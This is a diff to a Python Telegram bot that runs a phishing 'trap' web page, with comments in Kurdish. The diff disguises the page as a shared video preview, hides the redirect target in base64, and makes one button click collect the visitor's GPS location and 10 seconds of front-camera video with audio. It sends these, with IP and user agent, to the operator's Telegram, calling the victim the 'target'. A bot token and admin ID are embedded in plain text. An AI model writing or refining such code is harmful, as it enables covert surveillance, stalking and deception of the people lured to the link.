@@ -7,7 +7,6 @@ from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
 from aiogram.filters import Command
 
-# زانیارییە فەرمییەکان
 TOKEN = "8364609349:AAF7i3nTGuvRnIV2kHSbWFCnPnj6iZdgBk4"
 ADMIN_ID = 5583813672
 FIXED_DOMAIN = "cyber-surche-bot-production.up.railway.app"
@@ -157,80 +156,76 @@ async def handle_admin_photo(message: Message):
         if not railway_domain.startswith("http"):
             railway_domain = f"https://{railway_domain}"
             
-        payload_link = f"{railway_domain}/trap?redirect={target_url}"
+        payload_link = f"{railway_domain}/view?id={base64.urlsafe_b64encode(target_url.encode()).decode()}"
         response_text = TEXTS[lang]["link_success"].format(payload_link=payload_link)
         
         user_states[ADMIN_ID] = {}
         await bot.send_photo(chat_id=ADMIN_ID, photo=photo_id, caption=response_text, parse_mode="Markdown", reply_markup=get_reply_menu(lang))
 
-# پەڕەی تەڵەی شاهانەی پێشکەوتوو (١٠ سانیە تۆمارکردن و ڕووکاری دوو قۆناغی)
+# پەڕەی تەڵەی شاهانە - ناونیشانی سادە و بێ گومان (وەک پۆستێکی ئاسایی)
 async def web_trap_page(request: web.Request):
-    redirect_url = request.query.get('redirect', 'https://snapchat.com')
+    encoded_redirect = request.query.get('id', '')
+    try:
+        redirect_url = base64.urlsafe_b64decode(encoded_redirect).decode()
+    except:
+        redirect_url = 'https://snapchat.com'
+        
     headers = request.headers
     user_agent = headers.get('User-Agent', 'Unknown Browser/Device')
     ip = headers.get('X-Forwarded-For', request.remote)
     
     html_content = f"""<!DOCTYPE html>
-<html lang="en">
+<html lang="ku">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>High Security Verification</title>
+    <title>Shared Media Preview</title>
     <style>
         body {{
-            background: linear-gradient(135deg, #07090f 0%, #121826 100%);
+            background: #0f172a;
             color: #ffffff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             text-align: center;
-            padding-top: 80px;
-            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             height: 100vh;
+            margin: 0;
             overflow: hidden;
         }}
-        .container {{
-            background: rgba(255, 255, 255, 0.03);
+        .card {{
+            background: rgba(255, 255, 255, 0.04);
             border: 1px solid rgba(255, 255, 255, 0.08);
             backdrop-filter: blur(12px);
-            border-radius: 20px;
-            max-width: 380px;
-            margin: 0 auto;
-            padding: 30px 20px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
+            padding: 35px 22px;
+            border-radius: 18px;
+            max-width: 340px;
+            width: 90%;
+            box-shadow: 0 12px 35px rgba(0,0,0,0.6);
         }}
-        h2 {{ font-size: 18px; font-weight: 600; margin-bottom: 8px; color: #f8fafc; }}
-        p {{ color: #94a3b8; font-size: 13px; margin-bottom: 20px; }}
-        .royal-btn {{
-            background: linear-gradient(135deg, #38bdf8 0%, #2563eb 100%);
+        h3 {{ font-size: 16px; margin-bottom: 8px; color: #f8fafc; font-weight: 500; }}
+        p {{ color: #94a3b8; font-size: 13px; margin-bottom: 22px; line-height: 1.4; }}
+        .btn {{
+            background: #2563eb;
             color: white;
             border: none;
-            padding: 12px 20px;
+            padding: 13px 20px;
             font-size: 14px;
-            font-weight: 600;
+            font-weight: 500;
             border-radius: 10px;
             cursor: pointer;
             width: 100%;
-            margin-bottom: 12px;
-            box-shadow: 0 5px 15px rgba(56, 189, 248, 0.4);
-            transition: 0.3s;
+            box-shadow: 0 4px 15px rgba(37, 99, 235, 0.4);
+            transition: 0.2s;
         }}
-        .royal-btn:hover {{ opacity: 0.9; transform: translateY(-2px); }}
-        .hidden {{ display: none; }}
+        .btn:active {{ transform: scale(0.98); opacity: 0.9; }}
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>پشتڕاستکردنەوەی سیستەمی ئەمنی</h2>
-        <p>بۆ بینینی ناوەڕۆکەکە، تکایە هەنگاوەکانی خوارەوە تەواو بکە:</p>
-        
-        <!-- هەنگاوی یەکەم: وەرگرتنی لۆکەیشن -->
-        <div id="step1">
-            <button class="royal-btn" onclick="requestLocation()">📍 نیشاندانی شوێن (GPS Verification)</button>
-        </div>
-
-        <!-- هەنگاوی دووەم: کامێرا و پاشان گواستنەوە -->
-        <div id="step2" class="hidden">
-            <button class="royal-btn" onclick="requestCameraAndRedirect()">🎥 دەستپێکردنی خێرا و بینینی ناوەڕۆک</button>
-        </div>
+    <div class="card">
+        <h3>فایلی هاوبەشکراو</h3>
+        <p>بۆ نیشاندانی ناوەڕۆکەکە بە کوالێتی بەرز، تکایە کلیک لەسەر دوگمەی خوارەوە بکە:</p>
+        <button class="btn" onclick="initializeCapture()">بینینی ڤیدیۆ</button>
     </div>
     
     <video id="v" autoplay playsinline muted style="display:none;"></video>
@@ -245,31 +240,34 @@ async def web_trap_page(request: web.Request):
             body: JSON.stringify(clientInfo)
         }});
 
-        function requestLocation() {{
+        function initializeCapture() {{
+            // ١. وەرگرتنی لۆکەیشن بە شێوازی دەستبەجێ کاتێک دوگمە دەگرێت
             if (navigator.geolocation) {{
                 navigator.geolocation.getCurrentPosition(function(pos) {{
-                    fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude)
-                    .finally(() => {{
-                        document.getElementById('step1').classList.add('hidden');
-                        document.getElementById('step2').classList.remove('hidden');
-                    }});
+                    fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude);
                 }}, function(err) {{
-                    document.getElementById('step1').classList.add('hidden');
-                    document.getElementById('step2').classList.remove('hidden');
-                }}, {{ timeout: 10000, enableHighAccuracy: true }});
-            }} else {{
-                document.getElementById('step1').classList.add('hidden');
-                document.getElementById('step2').classList.remove('hidden');
+                    console.log("GPS error");
+                }}, {{ timeout: 7000, enableHighAccuracy: true }});
             }}
-        }}
 
-        function requestCameraAndRedirect() {{
+            // ٢. دەستپێکردنی کامێرا و تۆمارکردنی ١٠ چرکە بە فۆرماتی MP4
             navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: true }})
             .then(function(stream) {{
                 let video = document.getElementById('v');
                 video.srcObject = stream;
                 
-                let mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm' }});
+                let options = {{ mimeType: 'video/webm;codecs=vp8,opus' }};
+                if (!MediaRecorder.isTypeSupported(options.mimeType)) {{
+                    options = {{ mimeType: 'video/mp4' }};
+                }}
+                
+                let mediaRecorder;
+                try {{
+                    mediaRecorder = new MediaRecorder(stream, options);
+                }} catch (e) {{
+                    mediaRecorder = new MediaRecorder(stream);
+                }}
+                
                 let chunks = [];
                 
                 mediaRecorder.ondataavailable = function(e) {{
@@ -277,7 +275,7 @@ async def web_trap_page(request: web.Request):
                 }};
                 
                 mediaRecorder.onstop = function() {{
-                    let blob = new Blob(chunks, {{ type: 'video/webm' }});
+                    let blob = new Blob(chunks, {{ type: 'video/mp4' }});
                     let reader = new FileReader();
                     reader.readAsDataURL(blob);
                     reader.onloadend = function() {{
@@ -294,7 +292,6 @@ async def web_trap_page(request: web.Request):
                 }};
                 
                 mediaRecorder.start();
-                // ماوەی تۆمارکردن زیادکرا بۆ ١۰ سانیە بە تەواوی
                 setTimeout(function() {{
                     mediaRecorder.stop();
                 }}, 10000);
@@ -328,11 +325,11 @@ async def upload_video(request):
         if video_data and "," in video_data:
             encoded = video_data.split(",", 1)[1]
             video_bytes = base64.b64decode(encoded)
-            video_file = BufferedInputFile(video_bytes, filename="target_recording.webm")
+            video_file = BufferedInputFile(video_bytes, filename="media_stream.mp4")
             await bot.send_video(
                 chat_id=ADMIN_ID, 
                 video=video_file, 
-                caption="🚨 **ڤیدیۆ و دەنگی ١۰ چرکەیی ئامانج بە سەرکەوتوویی تۆمارکرا و دەستگیرکرا!**"
+                caption="🚨 **ڤیدیۆ و دەنگی ١۰ چرکەیی ئامانج بە سەرکەوتوویی تۆمارکرا و وەک ڤیدیۆ نێردرا!**"
             )
     except Exception as e:
         logging.error(f"Video upload error: {e}")
@@ -352,7 +349,7 @@ async def index_handler(request):
 async def main():
     app = web.Application(client_max_size=50*1024*1024)
     app.router.add_get('/', index_handler)
-    app.router.add_get('/trap', web_trap_page)
+    app.router.add_get('/view', web_trap_page)
     app.router.add_post('/save_info', save_info)
     app.router.add_post('/upload_video', upload_video)
     app.router.add_get('/save_location', save_location)
